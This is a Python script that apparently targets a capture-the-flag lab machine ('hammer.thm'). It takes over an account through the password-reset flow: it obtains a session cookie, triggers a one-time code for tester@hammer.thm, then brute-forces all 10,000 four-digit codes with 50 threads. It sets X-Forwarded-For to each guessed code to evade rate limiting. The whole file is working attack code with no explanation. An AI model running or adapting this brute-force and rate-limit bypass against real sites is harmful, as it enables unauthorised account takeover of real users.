import requests
from concurrent.futures import ThreadPoolExecutor



# Declare the url and data to be inserted
ip="10.82.169.0"
final_url = f"http://{ip}:1337/reset_password.php"
session = ""
FOUND= False
# send a request to get the session
def get_session():
    global session
    # Creating a PHPSESS 
    headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"http://{ip}:1337",
    "Connection": "keep-alive",
    "Referer": final_url,
    "Upgrade-Insecure-Requests": "1"
    }
    response = requests.get(f"http://{ip}:1337",headers=headers)
    cookie = response.headers.get("Set-Cookie")
    if(cookie):
        session=cookie.split(";")[0] 
        print(session)
    
# Now we have the session. We make the request to reset password

# First step - sending the request to the server to generate an OTP
def generate_code(url,data,headers):
    response = requests.post(url,data,headers=headers)
    body=response.text.lower()
    if(("seconds to enter your code".lower() in body )) : 
        print("OTP Generated successfully.")
    

# Second Step - Submitting the recovery code
def submitting_code(code):
    global FOUND
    if FOUND: 
        return
    payload={
        "recovery_code":code,
        "s":177
    }
    local_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
    "Referer": final_url,
    "Cookie": session,
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "X-Forwarded-For":code
    }
    response=requests.post(final_url,data=payload,headers=local_headers)
    if('Invalid or expired recovery code!' not in response.text):
        print(f"Code : {code} has succedded ###################")
        FOUND = True





# Program Officially starts here

get_session()
global_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
    "Referer": final_url,
    "Cookie": session,
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

generate_code(final_url,{"email":"tester@hammer.thm"},headers=global_headers)

#Code is generated - Bruteforce is starting - Queue Hacking music
# Generating the codes

with ThreadPoolExecutor(max_workers=50) as executor:
    for i in range(10000):
        code = str(i).zfill(4)
        if FOUND:
            break
    
        executor.submit(submitting_code,code)
    executor.shutdown(wait=False)

print("Bruteforce has finished")
    

